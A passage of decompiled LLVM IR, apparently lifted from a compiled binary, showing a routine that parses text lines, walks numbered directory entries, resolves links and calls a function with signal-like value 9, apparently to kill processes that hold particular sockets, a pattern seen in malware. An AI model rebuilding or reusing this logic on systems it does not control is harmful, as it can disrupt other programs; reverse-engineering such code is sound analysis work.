dec_label_pc_e624.backedge:                       ; preds = %dec_label_pc_e674, %dec_label_pc_e74c, %dec_label_pc_e798, %dec_label_pc_e6c0
  %v0_e62c = load i32, i32* @r8, align 4
  %v4_e630 = call i32 @function_12eec(i8* nonnull %stack_var_-581, i32 512, i32 %v0_e62c)
  %v2_e634 = icmp eq i32 %v4_e630, 0
  br i1 %v2_e634, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c

dec_label_pc_e67c:                                ; preds = %dec_label_pc_e674
  %v1_e680 = add i32 %v1_e6a0, 2
  %v2_e688 = add i32 %v1_e680, %v2_e684
  %v1_e68c = add i32 %v2_e688, -545
  %v2_e68c = inttoptr i32 %v1_e68c to i8*
  %v3_e68c = load i8, i8* %v2_e68c, align 1
  %v2_e690 = icmp eq i8 %v3_e68c, 0
  br i1 %v2_e690, label %bb133, label %bb132

bb132:                                            ; preds = %dec_label_pc_e67c
  %v8_e694 = icmp eq i8 %v3_e68c, 32
  br i1 %v8_e694, label %.thread10, label %dec_label_pc_e6a0

.thread10:                                        ; preds = %bb132
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

bb133:                                            ; preds = %dec_label_pc_e67c
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6a0:                                ; preds = %bb132
  %v0_e6a0 = load i32, i32* @r6, align 4
  %v2_e6a0 = add i32 %v0_e6a0, %v1_e6a0
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %bb134, %dec_label_pc_e6a0
  %v0_e6b013 = phi i32 [ %v1_e6b0, %bb134 ], [ %v2_e6a0, %dec_label_pc_e6a0 ]
  %v1_e6a4 = add i32 %v0_e6b013, 3
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i8*
  %v3_e6a4 = load i8, i8* %v2_e6a4, align 1
  %v2_e6a8 = icmp eq i8 %v3_e6a4, 0
  br i1 %v2_e6a8, label %.thread12, label %bb134

.thread12:                                        ; preds = %dec_label_pc_e6a4
  %v1_e6b014 = add i32 %v0_e6b013, 1
  br label %dec_label_pc_e6b8

bb134:                                            ; preds = %dec_label_pc_e6a4
  %v8_e6ac = icmp eq i8 %v3_e6a4, 32
  %v1_e6b0 = add i32 %v0_e6b013, 1
  br i1 %v8_e6ac, label %dec_label_pc_e6b8, label %dec_label_pc_e6a4

dec_label_pc_e6b8:                                ; preds = %bb134, %.thread12
  %v1_e6b015 = phi i32 [ %v1_e6b014, %.thread12 ], [ %v1_e6b0, %bb134 ]
  %v2_e6b8 = sub i32 %v1_e6b015, %v0_e6a0
  %v1_e6bc = add i32 %v2_e6b8, 2
  store i32 %v1_e6bc, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6c0:                                ; preds = %bb133, %.thread10, %dec_label_pc_e6b8
  %v1_e6cc = phi i32 [ %v1_e680, %.thread10 ], [ %v1_e680, %bb133 ], [ %v1_e6bc, %dec_label_pc_e6b8 ]
  %v0_e6c0 = load i32, i32* @r6, align 4
  %v2_e6c0 = add i32 %v0_e6c0, %v1_e680
  store i32 %v2_e6c0, i32* @r4, align 4
  %v2_e6cc = add i32 %v1_e6cc, %v2_e684
  store i32 0, i32* @r7, align 4
  %v3_e6d8 = add i32 %v2_e6cc, -545
  %v4_e6d8 = inttoptr i32 %v3_e6d8 to i8*
  store i8 0, i8* %v4_e6d8, align 1
  %v1_e6dc = inttoptr i32 %v2_e6c0 to i8*
  %v2_e6dc = call i32 @function_12c94(i8* %v1_e6dc)
  store i32 %v2_e6dc, i32* @r1, align 4
  %v0_e6e8 = load i32, i32* @r4, align 4
  %v3_e6ec = inttoptr i32 %v0_e6e8 to i8*
  %v4_e6ec = call i32 @function_12fe8(i8* %v3_e6ec, i32 %v2_e6dc, i32 %v2_e5b8)
  %v7_e6f0 = icmp eq i32 %v4_e6ec, -1
  br i1 %v7_e6f0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e70c.preheader

dec_label_pc_e70c.preheader:                      ; preds = %dec_label_pc_e6c0
  %v1_e6f4 = load i32, i32* @r7, align 4
  %v1_e6f8 = load i32, i32* @r6, align 4
  %v2_e6f8 = load i32, i32* @r5, align 4
  %v3_e6f8 = add i32 %v2_e6f8, %v1_e6f8
  store i32 %v1_e6f4, i32* @lr, align 4
  store i32 %v1_e6f4, i32* @r4, align 4
  %v1_e70c50 = add i32 %v3_e6f8, 2
  %v2_e70c51 = inttoptr i32 %v1_e70c50 to i8*
  %v3_e70c52 = load i8, i8* %v2_e70c51, align 1
  %v2_e71054 = icmp eq i8 %v3_e70c52, 0
  %v1_e71456 = add i32 %v2_e6f8, 2
  br i1 %v2_e71054, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e70c.preheader, %dec_label_pc_e70c.backedge
  %v0_e74c86 = phi i32 [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e734.pr = phi i32 [ %v0_e734.pr71, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_ea50 = phi i32 [ %v0_ea5074, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e71482 = phi i32 [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v1_e71456, %dec_label_pc_e70c.preheader ]
  %v0_e744 = phi i32 [ %v0_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e6f8, %dec_label_pc_e70c.preheader ]
  %v1_e720.in = phi i8 [ %v3_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e70c52, %dec_label_pc_e70c.preheader ]
  %v7_e71c = icmp eq i8 %v1_e720.in, 9
  br i1 %v7_e71c, label %.thread23, label %bb135

bb135:                                            ; preds = %dec_label_pc_e71c
  %v8_e720 = icmp eq i8 %v1_e720.in, 32
  br i1 %v8_e720, label %.thread23.thread35, label %dec_label_pc_e734

.thread23.thread35:                               ; preds = %bb135
  br label %dec_label_pc_e740

.thread23:                                        ; preds = %dec_label_pc_e71c
  br label %dec_label_pc_e740

dec_label_pc_e734:                                ; preds = %bb135
  %v7_e734 = icmp eq i32 %v0_e734.pr, 1
  br i1 %v7_e734, label %dec_label_pc_ea50, label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_e734
  %v0_e74079 = phi i32 [ %v1_ea50, %dec_label_pc_ea50 ], [ %v0_ea50, %dec_label_pc_e734 ]
  br label %dec_label_pc_e740

dec_label_pc_e740:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_e73c
  %v0_e740 = phi i32 [ %v0_ea50, %.thread23.thread35 ], [ %v0_ea50, %.thread23 ], [ %v0_e74079, %dec_label_pc_e73c ]
  %v0_e734.pr72 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_e73c ]
  %v7_e748 = icmp sgt i32 %v0_e740, 6
  br i1 %v7_e748, label %dec_label_pc_e74c, label %dec_label_pc_e70c.backedge

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e70c.backedge, %dec_label_pc_e740, %dec_label_pc_e70c.preheader
  %v1_e79c = phi i32 [ %v1_e71456, %dec_label_pc_e70c.preheader ], [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v0_e71482, %dec_label_pc_e740 ]
  %v0_e74c = phi i32 [ %v1_e6f4, %dec_label_pc_e70c.preheader ], [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v0_e74c86, %dec_label_pc_e740 ]
  %v2_e74c = icmp eq i32 %v0_e74c, 0
  br i1 %v2_e74c, label %dec_label_pc_e624.backedge, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e74c
  %v2_e760 = add i32 %v1_e79c, %v2_e684
  %v1_e764 = add i32 %v2_e760, -545
  %v2_e764 = inttoptr i32 %v1_e764 to i8*
  %v3_e764 = load i8, i8* %v2_e764, align 1
  %v2_e768 = icmp eq i8 %v3_e764, 0
  br i1 %v2_e768, label %dec_label_pc_e798, label %bb136

bb136:                                            ; preds = %dec_label_pc_e758
  %v8_e76c = icmp eq i8 %v3_e764, 32
  br i1 %v8_e76c, label %dec_label_pc_e798, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %bb136
  %v2_e774 = add i32 %v1_e79c, %v1_e6f8
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb137, %dec_label_pc_e774
  %v0_e78428 = phi i32 [ %v1_e784, %bb137 ], [ %v1_e79c, %dec_label_pc_e774 ]
  %v0_e778 = phi i32 [ %v1_e778, %bb137 ], [ %v2_e774, %dec_label_pc_e774 ]
  %v1_e778 = add i32 %v0_e778, 1
  %v2_e778 = inttoptr i32 %v1_e778 to i8*
  %v3_e778 = load i8, i8* %v2_e778, align 1
  %v2_e77c = icmp eq i8 %v3_e778, 0
  br i1 %v2_e77c, label %.thread27, label %bb137

.thread27:                                        ; preds = %dec_label_pc_e778
  %v1_e78429 = add i32 %v0_e78428, 1
  br label %dec_label_pc_e78c

bb137:                                            ; preds = %dec_label_pc_e778
  %v8_e780 = icmp eq i8 %v3_e778, 32
  %v1_e784 = add i32 %v0_e78428, 1
  br i1 %v8_e780, label %dec_label_pc_e78c, label %dec_label_pc_e778

dec_label_pc_e78c:                                ; preds = %bb137, %.thread27
  %v1_e794 = phi i32 [ %v1_e78429, %.thread27 ], [ %v1_e784, %bb137 ]
  %v2_e794 = add i32 %v1_e794, %v2_e684
  br label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %dec_label_pc_e758, %bb136, %dec_label_pc_e78c
  %v2_e7a4 = phi i32 [ %v2_e760, %dec_label_pc_e758 ], [ %v2_e760, %bb136 ], [ %v2_e794, %dec_label_pc_e78c ]
  %v2_e79c = add i32 %v1_e79c, %v1_e6f8
  store i32 %v2_e79c, i32* @r4, align 4
  %v3_e7a4 = add i32 %v2_e7a4, -545
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i8*
  store i8 0, i8* %v4_e7a4, align 1
  %v1_e7a8 = inttoptr i32 %v2_e79c to i8*
  %v2_e7a8 = call i32 @function_12c94(i8* %v1_e7a8)
  %v8_e7b0 = icmp sgt i32 %v2_e7a8, 15
  br i1 %v8_e7b0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e798
  %v0_e7b8 = load i32, i32* @r4, align 4
  %v2_e7bc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e7bc, i32* @r0, align 4
  %v2_e7c0 = bitcast i32* %stack_var_-52 to i8*
  %v3_e7c0 = call i32 @function_12cbc(i8* %v2_e7c0, i32 %v0_e7b8)
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4.loopexit:                       ; preds = %dec_label_pc_e624.backedge, %dec_label_pc_e624.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre99 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7c4.loopexit, %dec_label_pc_e7b4
  %v1_e7d4.pre-phi = phi i8* [ %.pre99, %dec_label_pc_e7c4.loopexit ], [ %v2_e7c0, %dec_label_pc_e7b4 ]
  %v2_e7d0.pre-phi = phi i32 [ %.pre, %dec_label_pc_e7c4.loopexit ], [ %v2_e7bc, %dec_label_pc_e7b4 ]
  %v0_e7c4 = load i32, i32* @r8, align 4
  %v1_e7c8 = call i32 @function_13654(i32 %v0_e7c4)
  %v2_e7d4 = call i32 @function_12c94(i8* %v1_e7d4.pre-phi)
  store i32 %v2_e7d4, i32* @r4, align 4
  %v2_e7d8 = icmp eq i32 %v2_e7d4, 0
  br i1 %v2_e7d8, label %dec_label_pc_ea28, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7c4
  %v3_e7e8 = call i32 @function_12288(i32 6, i32* null)
  store i32 %v3_e7e8, i32* @r0, align 4
  %v1_e7ec = call i32 @function_13a5c(i32 %v3_e7e8)
  store i32 %v1_e7ec, i32* @r8, align 4
  %v2_e7f0 = icmp eq i32 %v1_e7ec, 0
  br i1 %v2_e7f0, label %dec_label_pc_ea20, label %dec_label_pc_e800.preheader

dec_label_pc_e800.preheader:                      ; preds = %dec_label_pc_e7e0
  store i32 0, i32* @r5, align 4
  %v1_e80445 = inttoptr i32 %v1_e7ec to i32*
  %v2_e80446 = call i32 @function_13b58(i32* %v1_e80445)
  %v2_e80848 = icmp eq i32 %v2_e80446, 0
  br i1 %v2_e80848, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e800.loopexit:                       ; preds = %dec_label_pc_e818, %dec_label_pc_e82c, %dec_label_pc_e894
  %v0_e800 = load i32, i32* @r8, align 4
  %v1_e804 = inttoptr i32 %v0_e800 to i32*
  %v2_e804 = call i32 @function_13b58(i32* %v1_e804)
  %v2_e808 = icmp eq i32 %v2_e804, 0
  br i1 %v2_e808, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e810.preheader:                      ; preds = %dec_label_pc_e800.preheader, %dec_label_pc_e800.loopexit
  %v0_e81894 = phi i32 [ %v2_e804, %dec_label_pc_e800.loopexit ], [ %v2_e80446, %dec_label_pc_e800.preheader ]
  br label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e810.preheader, %dec_label_pc_e9fc
  %v0_e824 = phi i32 [ %v0_e81894, %dec_label_pc_e810.preheader ], [ %v2_ea08, %dec_label_pc_e9fc ]
  %v0_e810 = load i32, i32* @r5, align 4
  %v2_e810 = icmp eq i32 %v0_e810, 0
  br i1 %v2_e810, label %dec_label_pc_e818, label %dec_label_pc_ea14

dec_label_pc_e818:                                ; preds = %dec_label_pc_e810
  %v1_e818 = add i32 %v0_e824, 11
  %v2_e818 = inttoptr i32 %v1_e818 to i8*
  %v3_e818 = load i8, i8* %v2_e818, align 1
  %v4_e818 = zext i8 %v3_e818 to i32
  %v1_e81c = add nsw i32 %v4_e818, -48
  store i32 %v1_e818, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_e81c, 9
  br i1 %tmp, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e818
  %v3_e834 = call i32 @function_12288(i32 6, i32* null)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e840 = call i32 @function_12cbc(i8* %v2_e578, i32 %v3_e834)
  %v2_e848 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e84c = load i32, i32* @r7, align 4
  %v0_e850 = load i32, i32* @sl, align 4
  %v2_e850 = add i32 %v0_e850, %v2_e848
  store i32 %v2_e850, i32* @r0, align 4
  %v2_e854 = inttoptr i32 %v2_e850 to i8*
  %v3_e854 = call i32 @function_12cbc(i8* %v2_e854, i32 %v0_e84c)
  %v2_e85c = call i32 @function_12c94(i8* %v2_e578)
  %v0_e860 = load i32, i32* @r5, align 4
  store i32 %v2_e85c, i32* @r4, align 4
  %v2_e86c = inttoptr i32 %v0_e860 to i32*
  %v3_e86c = call i32 @function_12288(i32 7, i32* %v2_e86c)
  %v0_e874 = load i32, i32* @sl, align 4
  %v1_e874 = load i32, i32* @r4, align 4
  %v2_e874 = add i32 %v1_e874, %v0_e874
  store i32 %v2_e874, i32* @r0, align 4
  %v2_e878 = inttoptr i32 %v2_e874 to i8*
  %v3_e878 = call i32 @function_12cbc(i8* %v2_e878, i32 %v3_e86c)
  %v4_e888 = call i32 @function_13848(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e88c = icmp eq i32 %v4_e888, -1
  br i1 %v7_e88c, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e82c
  %v0_e894 = load i32, i32* @r5, align 4
  %v2_e89c = inttoptr i32 %v0_e894 to i32*
  %v3_e89c = call i32 @function_12288(i32 6, i32* %v2_e89c)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e8a8 = call i32 @function_12cbc(i8* %v2_e578, i32 %v3_e89c)
  %v2_e8b0 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e8b4 = load i32, i32* @r7, align 4
  %v0_e8b8 = load i32, i32* @sl, align 4
  %v2_e8b8 = add i32 %v0_e8b8, %v2_e8b0
  store i32 %v2_e8b8, i32* @r0, align 4
  %v2_e8bc = inttoptr i32 %v2_e8b8 to i8*
  %v3_e8bc = call i32 @function_12cbc(i8* %v2_e8bc, i32 %v0_e8b4)
  %v2_e8c4 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e8c8 = load i32, i32* @r5, align 4
  store i32 %v2_e8c4, i32* @r4, align 4
  %v2_e8d4 = inttoptr i32 %v0_e8c8 to i32*
  %v3_e8d4 = call i32 @function_12288(i32 9, i32* %v2_e8d4)
  %v0_e8dc = load i32, i32* @sl, align 4
  %v1_e8dc = load i32, i32* @r4, align 4
  %v2_e8dc = add i32 %v1_e8dc, %v0_e8dc
  store i32 %v2_e8dc, i32* @r0, align 4
  %v2_e8e0 = inttoptr i32 %v2_e8dc to i8*
  %v3_e8e0 = call i32 @function_12cbc(i8* %v2_e8e0, i32 %v3_e8d4)
  store i32 %v2_e558, i32* @r0, align 4
  %v1_e8e8 = call i32 @function_13a5c(i32 %v2_e558)
  store i32 %v1_e8e8, i32* @sb, align 4
  %v2_e8ec = icmp eq i32 %v1_e8e8, 0
  br i1 %v2_e8ec, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e8f4.preheader

dec_label_pc_e8f4.preheader:                      ; preds = %dec_label_pc_e894
  %v1_e8f840 = inttoptr i32 %v1_e8e8 to i32*
  %v2_e8f841 = call i32 @function_13b58(i32* %v1_e8f840)
  store i32 %v2_e8f841, i32* @r6, align 4
  %v2_e8fc43 = icmp eq i32 %v2_e8f841, 0
  br i1 %v2_e8fc43, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e8f4.loopexit:                       ; preds = %dec_label_pc_e914, %dec_label_pc_e9ac
  %v0_e8f4 = load i32, i32* @sb, align 4
  %v1_e8f8 = inttoptr i32 %v0_e8f4 to i32*
  %v2_e8f8 = call i32 @function_13b58(i32* %v1_e8f8)
  store i32 %v2_e8f8, i32* @r6, align 4
  %v2_e8fc = icmp eq i32 %v2_e8f8, 0
  br i1 %v2_e8fc, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e90cthread-pre-split:                ; preds = %dec_label_pc_e8f4.preheader, %dec_label_pc_e8f4.loopexit
  %v0_e90c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e90c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e90cthread-pre-split, %dec_label_pc_e9d4
  %v0_e90c = phi i32 [ %v0_e90c.pr, %dec_label_pc_e90cthread-pre-split ], [ 1, %dec_label_pc_e9d4 ]
  %v2_e90c = icmp eq i32 %v0_e90c, 0
  br i1 %v2_e90c, label %dec_label_pc_e914, label %dec_label_pc_e9fc

dec_label_pc_e914:                                ; preds = %dec_label_pc_e90c
  %v2_e914 = call i32 @function_12d34(i32 %v2_e56c, i32 4096)
  %v0_e918 = load i32, i32* @r5, align 4
  %v2_e920 = inttoptr i32 %v0_e918 to i32*
  %v3_e920 = call i32 @function_12288(i32 6, i32* %v2_e920)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e92c = call i32 @function_12cbc(i8* %v2_e578, i32 %v3_e920)
  %v2_e934 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e938 = load i32, i32* @r7, align 4
  %v0_e93c = load i32, i32* @sl, align 4
  %v2_e93c = add i32 %v0_e93c, %v2_e934
  store i32 %v2_e93c, i32* @r0, align 4
  %v2_e940 = inttoptr i32 %v2_e93c to i8*
  %v3_e940 = call i32 @function_12cbc(i8* %v2_e940, i32 %v0_e938)
  %v2_e948 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e94c = load i32, i32* @r5, align 4
  store i32 %v2_e948, i32* @r4, align 4
  %v2_e958 = inttoptr i32 %v0_e94c to i32*
  %v3_e958 = call i32 @function_12288(i32 9, i32* %v2_e958)
  %v0_e960 = load i32, i32* @sl, align 4
  %v1_e960 = load i32, i32* @r4, align 4
  %v2_e960 = add i32 %v1_e960, %v0_e960
  store i32 %v2_e960, i32* @r0, align 4
  %v2_e964 = inttoptr i32 %v2_e960 to i8*
  %v3_e964 = call i32 @function_12cbc(i8* %v2_e964, i32 %v3_e958)
  %v2_e96c = call i32 @function_12c94(i8* %v2_e578)
  %v0_e974 = load i32, i32* @sl, align 4
  %v2_e974 = add i32 %v0_e974, %v2_e96c
  store i32 %v2_e974, i32* @r0, align 4
  %v2_e978 = inttoptr i32 %v2_e974 to i8*
  %v3_e978 = call i32 @function_12cbc(i8* %v2_e978, i32 ptrtoint ([2 x i8]* @global_var_15f20.23 to i32))
  %v2_e980 = call i32 @function_12c94(i8* %v2_e578)
  %v0_e984 = load i32, i32* @r6, align 4
  %v1_e984 = add i32 %v0_e984, 11
  %v0_e988 = load i32, i32* @sl, align 4
  %v2_e988 = add i32 %v0_e988, %v2_e980
  store i32 %v2_e988, i32* @r0, align 4
  %v2_e98c = inttoptr i32 %v2_e988 to i8*
  %v3_e98c = call i32 @function_12cbc(i8* %v2_e98c, i32 %v1_e984)
  %v4_e99c = call i32 @function_13848(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e9a0 = icmp eq i32 %v4_e99c, -1
  br i1 %v7_e9a0, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e914
  %v2_e9ac = call i32 @function_12c94(i8* %v2_e590)
  store i32 %v2_e9ac, i32* @r1, align 4
  %v4_e9c0 = call i32 @function_12fe8(i8* %v2_e590, i32 %v2_e9ac, i32 %v2_e7d0.pre-phi)
  %v7_e9c4 = icmp eq i32 %v4_e9c0, -1
  br i1 %v7_e9c4, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9ac
  %v0_e9cc = load i32, i32* @r7, align 4
  %v2_e9d4 = inttoptr i32 %v0_e9cc to i8*
  %v3_e9d4 = call i32 @function_12dc0(i8* %v2_e9d4, i32 10)
  %v2_e9dc = call i32 @function_13754(i32 %v3_e9d4, i32 9)
  %v0_e9e0 = load i32, i32* @sb, align 4
  %v1_e9e4 = inttoptr i32 %v0_e9e0 to i32*
  %v2_e9e4 = call i32 @function_13b58(i32* %v1_e9e4)
  store i32 %v2_e9e4, i32* @r6, align 4
  %v2_e9e8 = icmp eq i32 %v2_e9e4, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e9e8, label %dec_label_pc_e9fc, label %dec_label_pc_e90c

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e8f4.loopexit, %dec_label_pc_e9d4, %dec_label_pc_e90c, %dec_label_pc_e8f4.preheader
  %v0_e9fc = load i32, i32* @sb, align 4
  %v1_ea00 = inttoptr i32 %v0_e9fc to i32*
  %v2_ea00 = call i32 @function_139a8(i32* %v1_ea00)
  %v0_ea04 = load i32, i32* @r8, align 4
  %v1_ea08 = inttoptr i32 %v0_ea04 to i32*
  %v2_ea08 = call i32 @function_13b58(i32* %v1_ea08)
  %v2_ea0c = icmp eq i32 %v2_ea08, 0
  br i1 %v2_ea0c, label %dec_label_pc_ea14, label %dec_label_pc_e810

dec_label_pc_ea14:                                ; preds = %dec_label_pc_e800.loopexit, %dec_label_pc_e9fc, %dec_label_pc_e810, %dec_label_pc_e800.preheader
  %v0_ea14 = load i32, i32* @r8, align 4
  %v1_ea18 = inttoptr i32 %v0_ea14 to i32*
  %v2_ea18 = call i32 @function_139a8(i32* %v1_ea18)
  %v0_ea1c = load i32, i32* @r5, align 4
  %v1_ea1c = urem i32 %v0_ea1c, 256
  br label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e7e0, %dec_label_pc_ea14
  %storemerge = phi i32 [ %v1_ea1c, %dec_label_pc_ea14 ], [ 0, %dec_label_pc_e7e0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ea24 = call i32 @function_14a84(i32 1)
  br label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e7c4, %dec_label_pc_ea20
  %v1_ea2c = call i32 @function_122b4(i32 6)
  %v1_ea34 = call i32 @function_122b4(i32 7)
  %v1_ea3c = call i32 @function_122b4(i32 9)
  br label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %dec_label_pc_e5f4, %dec_label_pc_ea28
  %v0_ea40 = load i32, i32* @r4, align 4
  %v2_ea4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ea4c, i32* @r4, align 4
  store i32 %v6_e544, i32* @r5, align 4
  store i32 %v9_e544, i32* @r6, align 4
  store i32 %v12_e544, i32* @r7, align 4
  store i32 %v15_e544, i32* @r8, align 4
  store i32 %v18_e544, i32* @sb, align 4
  store i32 %v21_e544, i32* @sl, align 4
  store i32 %v24_e544, i32* @fp, align 4
  ret i32 %v0_ea40

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e734
  %v1_ea50 = add i32 %v0_ea50, 1
  store i32 %v1_ea50, i32* @lr, align 4
  %v7_ea54 = icmp eq i32 %v0_ea50, 0
  br i1 %v7_ea54, label %dec_label_pc_ea5c, label %dec_label_pc_e73c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea50
  %v1_ea5c = add i32 %v0_e744, 3
  %v2_ea5c = inttoptr i32 %v1_ea5c to i8*
  %v3_ea5c = load i8, i8* %v2_ea5c, align 1
  %v7_ea60 = icmp eq i8 %v3_ea5c, 65
  br i1 %v7_ea60, label %dec_label_pc_ea70, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_ea5c
  br label %dec_label_pc_e70c.backedge

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c
  store i32 %v1_ea50, i32* @r4, align 4
  br label %dec_label_pc_e70c.backedge

dec_label_pc_e70c.backedge:                       ; preds = %.thread33, %dec_label_pc_ea70, %dec_label_pc_e740
  %v0_e74c85 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e74c86, %dec_label_pc_e740 ], [ %v0_e74c86, %.thread33 ]
  %v0_ea5074 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e740, %dec_label_pc_e740 ], [ %v1_ea50, %.thread33 ]
  %v0_e734.pr71 = phi i32 [ 0, %dec_label_pc_ea70 ], [ %v0_e734.pr72, %dec_label_pc_e740 ], [ 0, %.thread33 ]
  %v0_e70c = add i32 %v0_e744, 1
  %v1_e70c = add i32 %v0_e744, 3
  %v2_e70c = inttoptr i32 %v1_e70c to i8*
  %v3_e70c = load i8, i8* %v2_e70c, align 1
  %v2_e710 = icmp eq i8 %v3_e70c, 0
  %v1_e714 = add i32 %v0_e71482, 1
  br i1 %v2_e710, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_ea80:                                ; preds = %dec_label_pc_e544
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_e5f4

; uselistorder directives
  uselistorder i32 %v1_e714, { 1, 0 }
  uselistorder i8 %v3_e70c, { 1, 0 }
  uselistorder i32 %v0_e74c85, { 1, 0 }
  uselistorder i32 %v1_ea50, { 4, 3, 0, 2, 5, 1 }
  uselistorder i32 %v2_ea08, { 1, 0 }
  uselistorder i32 %v1_e778, { 1, 0 }
  uselistorder i32 %v0_e78428, { 1, 0 }
  uselistorder i32 %v1_e79c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_e740, { 1, 0 }
  uselistorder i32 %v0_e71482, { 1, 0 }
  uselistorder i32 %v0_ea50, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_e74c86, { 1, 2, 0 }
  uselistorder i32 %v1_e71456, { 1, 0 }
  uselistorder i32 %v2_e6f8, { 1, 0 }
  uselistorder i32 %v1_e6f4, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v0_e6b013, { 1, 0, 2 }
  uselistorder i32 %v0_e6a0, { 1, 0 }
  uselistorder i32 %v1_e680, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_e614, { 1, 2, 0 }
  uselistorder i32 %v2_e56c, { 1, 0, 2 }
  uselistorder i32 %v2_e558, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_12dc0, { 1, 0, 2, 4, 3 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_15f20.23 to i32), { 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_12eec, { 1, 0 }
  uselistorder label %dec_label_pc_e70c.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ea40, { 1, 0 }
  uselistorder label %dec_label_pc_ea28, { 1, 0 }
  uselistorder label %dec_label_pc_ea20, { 1, 0 }
  uselistorder label %dec_label_pc_ea14, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e9fc, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e90c, { 1, 0 }
  uselistorder label %dec_label_pc_e90cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_e8f4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_e810, { 1, 0 }
